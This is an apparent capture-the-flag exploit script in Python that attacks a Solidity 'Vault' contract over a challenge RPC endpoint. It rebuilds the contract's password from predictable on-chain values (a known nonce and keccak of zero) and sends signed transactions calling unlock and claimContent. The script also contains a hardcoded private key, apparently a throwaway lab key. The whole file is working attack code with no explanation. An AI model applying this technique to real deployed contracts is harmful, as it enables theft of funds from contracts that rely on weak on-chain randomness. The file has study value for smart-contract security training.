from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from Crypto.Util.number import bytes_to_long, long_to_bytes
from pwn import *

x = {
    "PrivateKey": "0xbed49dfb41f80d7e18ab97b7e21fdb84b5301077c20889715694e08ac37657d8",
    "Address": "0x0f7B6c74a859BBbDBcaCf8C3458E890d715e9dA1",
    "TargetAddress": "0xbA74012A417Fc99CD0Ae662ca951EF7773Eea774",
    "setupAddress": "0x1f62246F40cBFfC38Cdbee477EFbD95140629B65"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

url = 'http://46.101.78.65:31809/rpc'

w3 = Web3(Web3.HTTPProvider(url))

'''
block_number_or_hash = 'latest'
block = w3.eth.getBlock(block_number_or_hash)
print(block.number)
print(block.hash)
#sleep(5)
block_number = w3.eth.block_number
print(block_number)
'''

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)


#solcjs --abi --bin Setup.sol #generate .abi .bin
#with open('Setup_sol_Setup.abi','r') as f:
#	abi = json.load(f)



#contract_instance = w3.eth.contract(address=SetupContract, abi=abi)

account_from = {
	'private_key': PrivateKey,
	'address': account_address,
}

#construct_txn = contract_instance.constructor().buildTransaction(
#	{
#		'from': account_from['address'],
#		'nonce': w3.eth.get_transaction_count(account_from['address']),
#		"gasPrice": w3.to_wei(50, 'gwei'),
#		"gas": 21000,
#		"value": w3.to_wei(1, 'ether')
#	}
#)

#tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
#tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
#tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)


#    function _generateKey(uint256 _reductor) private returns (uint256 ret) {
#        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
#        nonce++;
#    }

def _generateKey(block_number, _reductor, nonce):
	#block = w3.eth.getBlock(block_number - _reductor)
	return bytes_to_long(Web3.solidityKeccak(['uint256'], [nonce]))

#  function _magicPassword() private returns (bytes8) {
#        uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
#        uint128 _key2 = uint128(_generateKey(2));
#        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
#        return (_secret >> 32 | _secret << 16);
#    }

def _magicPassword(block, passphrase):
	nonce = 4
	_key1 = _generateKey(block.number, block.timestamp % 2 + 1, nonce)
	_key2 = _generateKey(block.number, 2, nonce+1) & (2**128-1)
	_secret = (((passphrase ^ _key1) >> 128) ^ _key2) >> 64
	return (_secret >> 32 | _secret << 16) & (2**64 - 1)

#for block_number in range(block_number_new-30, block_number_new+30, 1):
block_number = w3.eth.block_number
block = w3.eth.getBlock(block_number)
print(block.timestamp)
print(block.number)

#sleep(256)

#passphrase = bytes32(keccak256(abi.encodePacked(uint256(blockhash(block.timestamp)))));
passphrase = bytes_to_long(Web3.solidityKeccak(['uint256'], [0]))

pwd = _magicPassword(block, passphrase)

addr = ((int(Address, 16) & (2**64-1)) << 64) + pwd
password = long_to_bytes(addr)

with open('Vault_sol_Vault.abi','r') as f:
	abi = json.load(f)

contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)

construct_txn = contract_instance2.functions.unlock(password).build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		'chainId': w3.eth.chain_id,
		#'value' : 1
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
	}
)

tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
construct_txn = contract_instance2.functions.claimContent().build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		'chainId': w3.eth.chain_id,
	}
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')


with open('Setup_sol_Setup.abi','r') as f:
	abi = json.load(f)

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')
